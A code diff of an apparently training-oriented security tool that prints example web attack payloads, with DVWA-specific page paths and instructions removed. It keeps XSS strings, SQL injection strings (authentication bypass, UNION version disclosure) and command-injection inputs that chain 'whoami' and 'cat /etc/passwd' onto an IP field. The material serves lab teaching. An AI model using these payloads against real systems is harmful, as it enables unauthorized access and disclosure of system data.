@@ -176,7 +176,7 @@ class VulnWeaver:
 
 
 def show_dvwa_xss():
-    """Display DVWA XSS test payloads"""
+    """Display XSS test payloads"""
     print("""
 ╔═══════════════════════════════════════════════════════════════╗
 ║  XSS PAYLOADS FOR TESTING                                     ║
@@ -186,25 +186,19 @@ def show_dvwa_xss():
 
 PAYLOAD #1 — Basic Script Tag
 ============================================================
-Template:     <script>[PAYLOAD]</script>
 Test:    <script>alert(1)</script>
-Page:    vulnerabilities/xss_r/
-How to Test:  Paste into the "What's your name?" input field
 Expected:     Alert box pops up with '1'
 
 PAYLOAD #2 — Image onerror Event
 ============================================================
-Template:     <img src=x onerror=[PAYLOAD]>
 Test:    <img src=x onerror=alert(1)>
-Page:    vulnerabilities/xss_r/
-How to Test:  Paste into the "What's your name?" input field
 Expected:     Alert box pops up with '1'
 
 """)
 
 
 def show_dvwa_sqli():
-    """Display DVWA SQLi test payloads"""
+    """Display SQLi test payloads"""
     print("""
 ╔═══════════════════════════════════════════════════════════════╗
 ║  SQLi PAYLOADS FOR TESTING                                    ║
@@ -214,11 +208,7 @@ def show_dvwa_sqli():
 
 PAYLOAD #1 — Authentication Bypass (Always TRUE)
 ============================================================
-Template:     ' OR '1'='1
-DVWA Test:    1' OR '1'='1
-DVWA Page:    vulnerabilities/sqli/
-How to Test:  Enter in "User ID" field, click Submit
-Expected:     Returns first user in database (usually admin)
+Test:    1' OR '1'='1
 
 EXPLANATION:
   Original Query: SELECT first_name, surname FROM users WHERE user_id = '[INPUT]'
@@ -227,23 +217,17 @@ EXPLANATION:
 
 PAYLOAD #2 — UNION SELECT (Version Disclosure)
 ============================================================
-Template:     ' UNION SELECT NULL,NULL
-DVWA Test:    1' UNION SELECT NULL,version()#
-DVWA Page:    vulnerabilities/sqli/
-How to Test:  Enter in "User ID" field, click Submit
-Expected:     Displays MySQL version in the surname field
-
+Test:    1' UNION SELECT NULL,version()#
 EXPLANATION:
   Original Query: SELECT first_name, surname FROM users WHERE user_id = '[INPUT]'
   Becomes:        SELECT first_name, surname FROM users WHERE user_id = '1' UNION SELECT NULL,version()#'
   Result:         UNION appends MySQL version() output as a second result row
-  Note:           # symbol comments out the trailing ' quote
 
 """)
 
 
 def show_dvwa_cmdi():
-    """Display DVWA Command Injection test payloads"""
+    """Display Command Injection test payloads"""
     print("""
 ╔═══════════════════════════════════════════════════════════════╗
 ║  COMMAND INJECTION PAYLOADS FOR TESTING                       ║
@@ -253,10 +237,7 @@ def show_dvwa_cmdi():
 
 PAYLOAD #1 — Semicolon Separator (Sequential Execution)
 ============================================================
-Template:     [VALID_IP] ; [COMMAND]
-DVWA Test:    127.0.0.1 ; whoami
-DVWA Page:    vulnerabilities/exec/
-How to Test:  Enter in "IP address" field, click Submit
+Test:    127.0.0.1 ; whoami
 Expected:     Shows ping output, then displays current Linux username (likely www-data)
 
 EXPLANATION:
@@ -267,10 +248,7 @@ EXPLANATION:
 
 PAYLOAD #2 — Pipe Separator (Output Chaining)
 ============================================================
-Template:     [VALID_IP] | [COMMAND]
-DVWA Test:    127.0.0.1 | cat /etc/passwd
-DVWA Page:    vulnerabilities/exec/
-How to Test:  Enter in "IP address" field, click Submit
+Test:    127.0.0.1 | cat /etc/passwd
 Expected:     Displays contents of /etc/passwd (system users list)
 
 EXPLANATION:
